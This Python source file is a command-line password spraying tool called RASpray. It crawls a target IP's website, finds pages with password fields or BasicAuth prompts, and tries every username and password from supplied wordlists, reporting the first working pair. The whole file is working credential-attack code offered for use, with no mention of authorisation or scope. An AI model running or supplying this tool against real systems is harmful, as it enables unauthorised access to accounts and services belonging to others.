#!/usr/bin/env python3

import sys
import re
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth
from requests.exceptions import RequestException, Timeout, ConnectionError
from urllib.parse import urljoin

# Define the tool's name and version
TOOL_NAME = "RASpray"
VERSION = "1.0.0"

# Function to display the RASPRAY banner
def display_banner():
    banner = r"""
    
    ██████╗  █████╗     ███████╗██████╗ ██████╗  █████╗ ██╗   ██╗
    ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
    ██████╔╝███████║    ███████╗██████╔╝██████╔╝███████║ ╚████╔╝ 
    ██╔══██╗██╔══██║    ╚════██║██╔═══╝ ██╔══██╗██╔══██║  ╚██╔╝  
    ██║  ██║██║  ██║    ███████║██║     ██║  ██║██║  ██║   ██║   
    ╚═╝  ╚═╝╚═╝  ╚═╝    ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                                                             
    Version: 1.0.0
    """
    print(banner)

# Function to display help message
def display_help():
    """
    Displays the help message with tool usage and options.
    """
    help_text = f"""
    {TOOL_NAME} - Password Spraying Tool (v{VERSION})
    
    Usage: {TOOL_NAME} [options]

    Options:
        -h, --help              Show this help message and exit
        -u, --users             Specify the file containing usernames
        -p, --pass              Specify the file containing passwords
        -i, --ip                Specify the target IP address
        --version               Show the tool version and exit
        --min-len               Specify the minimum length of usernames or passwords
        --max-len               Specify the maximum length of usernames or passwords
        --uppercase             Require at least 1 uppercase letter
        --lowercase             Require at least 1 lowercase letter
        --numbers               Require at least 1 number
        --special-chars         Require at least 1 special character (e.g., !, @, #)
    """
    print(help_text)

# Function to display the version
def display_version():
    """
    Displays the current version of the tool.
    """
    print(f"{TOOL_NAME} version {VERSION}")

# Function to traverse a website and find password fields or BasicAuth requests
def traverse_website(base_url, session, max_depth=3):
    """
    Traverses the website starting from the base URL. Follows links found on each page.
    Implements a depth limit to avoid deep crawling and infinite loops.
    
    Args:
        base_url (str): The starting URL of the website.
        session (Session): The session object to maintain cookies across requests.
        max_depth (int): Maximum depth to traverse the website.

    Returns:
        list: A list of URLs found on the website.
    """
    visited = set()
    to_visit = [(base_url, 0)]  # (URL, depth)
    links = []

    while to_visit:
        url, depth = to_visit.pop(0)
        if depth > max_depth:
            continue
        
        if url in visited:
            continue
        
        visited.add(url)
        
        try:
            response = session.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')

            # Collect all links on the page
            for a in soup.find_all('a', href=True):
                full_url = urljoin(base_url, a['href'])
                
                # Only add unvisited links to the list
                if full_url not in visited:
                    links.append(full_url)
                    to_visit.append((full_url, depth + 1))

        except RequestException as e:
            print(f"Error traversing {url}: {e}")
    
    return links

# Function to check if a page contains a password field or prompts BasicAuth
def is_password_requested(url, session):
    """
    Checks if the given page contains an input field for a password or requests Basic Authentication.

    Args:
        url (str): The URL of the page to check.
        session (Session): The session object to make requests.

    Returns:
        bool: True if the page contains a password field or prompts for Basic Authentication, False otherwise.
    """
    try:
        # Send a HEAD request first to avoid downloading the entire page if it's protected by BasicAuth
        response = session.head(url, timeout=10)

        # Check if BasicAuth is requested (401 Unauthorized)
        if response.status_code == 401:
            print(f"BasicAuth requested on {url}")
            return True
        
        # If no BasicAuth, make a GET request and parse the HTML to check for password fields
        response = session.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Parse HTML to look for password fields
        password_fields = soup.find_all('input', {'type': 'password'})
        
        if password_fields:
            print(f"Password field found on {url}")
            return True
        else:
            print(f"No password field on {url}")
            return False

    except RequestException as e:
        print(f"Error checking {url}: {e}")
        return False


# Function to filter usernames or passwords based on user criteria
def filter_by_criteria(items, min_len=None, max_len=None, uppercase=False, lowercase=False, numbers=False, special_chars=False):
    """
    Filters a list of usernames or passwords based on specified criteria.

    Args:
        items (list): A list of usernames or passwords to filter.
        min_len (int): Minimum length.
        max_len (int): Maximum length.
        uppercase (bool): Require uppercase letters.
        lowercase (bool): Require lowercase letters.
        numbers (bool): Require numbers.
        special_chars (bool): Require special characters.

    Returns:
        list: A filtered list of usernames or passwords.
    """
    filtered = []
    
    for item in items:
        if min_len and len(item) < min_len:
            continue
        if max_len and len(item) > max_len:
            continue
        if uppercase and not re.search(r'[A-Z]', item):
            continue
        if lowercase and not re.search(r'[a-z]', item):
            continue
        if numbers and not re.search(r'\d', item):
            continue
        if special_chars and not re.search(r'[!@#$%^&*(),.?":{}|<>]', item):
            continue
        filtered.append(item)
    
    return filtered

# Function to perform password spraying
def password_spraying(ip_address, username_file, password_file, criteria):
    """
    Performs password spraying by attempting each username/password combination
    on pages where password fields are found or Basic Authentication is requested.

    Args:
        ip_address (str): The target IP address.
        username_file (str): Path to the file containing usernames.
        password_file (str): Path to the file containing passwords.
        criteria (dict): Criteria for filtering usernames and passwords.
    """
    # Open the username and password files
    with open(username_file, 'r') as user_file:
        usernames = [line.strip() for line in user_file.readlines()]
    
    with open(password_file, 'r') as pass_file:
        passwords = [line.strip() for line in pass_file.readlines()]

    # Filter usernames and passwords by the specified criteria
    usernames = filter_by_criteria(usernames, **criteria)
    passwords = filter_by_criteria(passwords, **criteria)
    
    # Create a session to persist cookies across requests
    session = requests.Session()

    # Traverse through the website and find pages with password fields or BasicAuth
    base_url = f'http://{ip_address}'
    pages_to_check = traverse_website(base_url, session)
    
    for page in pages_to_check:
        # Ensure we have a full URL to check
        full_url = urljoin(base_url, page)
        
        # Check if the page requests a password or BasicAuth
        if is_password_requested(full_url, session):
            # Try each username/password combination
            for username in usernames:
                for password in passwords:
                    print(f"Trying username: {username}, password: {password} on {full_url}")
                    
                    try:
                        # Attempt to login with the credentials using BasicAuth
                        response = session.get(full_url, auth=HTTPBasicAuth(username, password), timeout=10)
                        
                        # Check if the authentication was successful
                        if response.status_code == 200:
                            print(f"Success! Username: {username}, Password: {password} on {full_url}")
                            return
                        else:
                            print(f"Failed for Username: {username}, Password: {password} on {full_url}")
                    except (Timeout, ConnectionError):
                        print(f"Connection failed for {full_url}")
                    except RequestException as e:
                        print(f"An error occurred: {e}")

# Main function
def main():
    """
    The main function that parses command-line arguments and initiates the password spraying process.
    """
    # Display the banner
    display_banner()

    # Check if the user requested help or version
    if len(sys.argv) > 1:
        if sys.argv[1] in ['-h', '--help']:
            display_help()
            sys.exit(0)
        elif sys.argv[1] == '--version':
            display_version()
            sys.exit(0)
    
    # Check if the required arguments are provided
    if '-u' not in sys.argv or '-p' not in sys.argv or '-i' not in sys.argv:
        print("Missing required arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Parse user-specified criteria
    criteria = {
        'min_len': int(sys.argv[sys.argv.index('--min-len') + 1]) if '--min-len' in sys.argv else None,
        'max_len': int(sys.argv[sys.argv.index('--max-len') + 1]) if '--max-len' in sys.argv else None,
        'uppercase': '--uppercase' in sys.argv,
        'lowercase': '--lowercase' in sys.argv,
        'numbers': '--numbers' in sys.argv,
        'special_chars': '--special-chars' in sys.argv
    }

    # Get the values of the provided arguments
    try:
        ip_address = sys.argv[sys.argv.index('-i') + 1]
        username_file = sys.argv[sys.argv.index('-u') + 1]
        password_file = sys.argv[sys.argv.index('-p') + 1]
    except (ValueError, IndexError):
        print("Invalid arguments! Use --help for usage instructions.")
        sys.exit(1)
    
    # Call the password spraying function
    password_spraying(ip_address, username_file, password_file, criteria)

if __name__ == '__main__':
    main()
